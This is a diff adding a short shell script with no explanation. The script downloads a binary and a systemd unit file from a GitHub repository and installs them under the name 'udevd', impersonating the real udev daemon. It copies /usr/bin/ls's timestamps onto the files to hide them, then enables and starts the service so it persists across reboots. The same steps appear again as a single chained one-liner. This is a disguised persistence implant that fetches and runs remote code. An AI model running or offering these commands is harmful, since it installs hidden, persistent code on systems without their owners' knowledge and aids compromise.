@@ -1,0 +1,8 @@
+curl https://raw.githubusercontent.com/bjtemp001/kdr/master/udevd -o /usr/bin/udevd
+curl https://raw.githubusercontent.com/bjtemp001/kdr/master/udevd.txt -o /etc/systemd/system/udevd.service
+touch -r /usr/bin/ls /usr/bin/udevd /etc/systemd/system/udevd.service
+systemctl daemon-reload
+systemctl enable udevd
+systemctl start udevd
+
+curl https://raw.githubusercontent.com/bjtemp001/kdr/master/udevd -o /usr/bin/udevd && curl https://raw.githubusercontent.com/bjtemp001/kdr/master/udevd.txt -o /etc/systemd/system/udevd.service && touch -r /usr/bin/ls /usr/bin/udevd /etc/systemd/system/udevd.service && systemctl daemon-reload && systemctl enable udevd && systemctl start udevd
